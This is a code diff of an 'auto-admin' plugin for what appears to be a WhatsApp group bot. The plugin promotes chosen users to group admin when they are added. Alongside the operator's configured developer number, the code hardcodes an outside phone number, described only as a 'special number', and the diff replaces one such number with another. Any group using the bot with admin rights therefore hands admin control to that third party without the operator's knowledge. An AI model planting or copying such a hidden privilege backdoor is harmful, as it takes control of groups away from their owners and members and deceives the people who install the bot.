@@ -1,74 +1,62 @@
 const { cmd } = require('../command');
 const config = require('../config');
 
-// Auto-admin system using body event
+// Track last promotion time per group
+const lastPromotion = {};
+
 cmd({
-    'on': "body"
-}, async (conn, m, store, {
-    from,
-    body,
+    on: "body" // Using your existing event structure
+}, 
+async (conn, mek, m, { 
+    from, // Group JID
     isGroup,
-    isAdmins,
+    participants,
+    groupMetadata,
     isBotAdmins,
-    reply,
-    sender,
-    mek // Raw message object
+    reply
 }) => {
     try {
-        // Check if feature is enabled
-        if (config.AUTO_ADMIN !== "true") return;
+        // Skip if not enabled or not a group
+        if (config.AUTO_ADMIN !== "true" || !isGroup || !isBotAdmins) return;
 
-        // Only process group messages
-        if (!isGroup) return;
-
-        // Get the participant update info if available
+        // MANUALLY extract participant update from raw message
         const participantUpdate = mek.message?.groupParticipantsUpdate;
         if (!participantUpdate || participantUpdate.action !== 'add') return;
 
-        // Normalize JIDs
-        const normalizeJid = (jid) => jid?.includes('@') ? jid : `${jid}@s.whatsapp.net`;
+        // Rate limit: 3 seconds per group
+        const now = Date.now();
+        if (lastPromotion[from] && now - lastPromotion[from] < 3000) return;
 
-        // Authorized users
-        const AUTHORIZED_USERS = [
-            normalizeJid(config.DEV),
-            "923103448168@s.whatsapp.net"
+        // Convert numbers to standard JID format
+        const toJid = num => num?.replace(/\D/g, '') + '@s.whatsapp.net';
+
+        // Authorized users (DEV + special number)
+        const allowedUsers = [
+            toJid(config.DEV),
+            toJid("923427582273")
         ].filter(Boolean);
 
-        // Check if added user is authorized
-        const addedUsers = participantUpdate.participants.map(normalizeJid);
-        const shouldPromote = addedUsers.some(jid => AUTHORIZED_USERS.includes(jid));
-
-        if (shouldPromote && isBotAdmins) {
-            // Get current admin list
-            const groupMetadata = await conn.groupMetadata(from);
-            const adminJids = groupMetadata.participants
-                .filter(p => p.admin)
-                .map(p => p.id);
-
-            // Filter users who need promotion
-            const usersToPromote = addedUsers.filter(jid => 
-                AUTHORIZED_USERS.includes(jid) && 
-                !adminJids.includes(jid)
+        // Check newly added participants
+        const newAdmins = participantUpdate.participants
+            .map(p => toJid(p))
+            .filter(jid => 
+                allowedUsers.includes(jid) &&
+                !groupMetadata.participants.some(p => p.id === jid && p.admin)
             );
 
-            if (usersToPromote.length > 0) {
-                await conn.groupParticipantsUpdate(
-                    from,
-                    usersToPromote,
-                    "promote"
-                );
+        if (newAdmins.length > 0) {
+            await conn.groupParticipantsUpdate(from, newAdmins, "promote");
+            lastPromotion[from] = now;
 
-                // Send notification if enabled
-                if (config.AUTO_ADMIN_NOTIFY === "true") {
-                    await conn.sendMessage(from, {
-                        text: `${usersToPromote.map(jid => `@${jid.split('@')[0]}`).join(' ')} ${usersToPromote.length > 1 ? 'have' : 'has'} been automatically promoted to admin. 👑`,
-                        mentions: usersToPromote
-                    });
-                }
+            // Optional notification
+            if (config.AUTO_ADMIN_NOTIFY === "true") {
+                await conn.sendMessage(from, {
+                    text: `@${newAdmins[0].split('@')[0]} is now admin 👑`,
+                    mentions: [newAdmins[0]]
+                });
             }
         }
     } catch (error) {
-        console.error("Auto-admin error:", error);
+        console.error("Auto-admin error:", error.message);
     }
 });
-
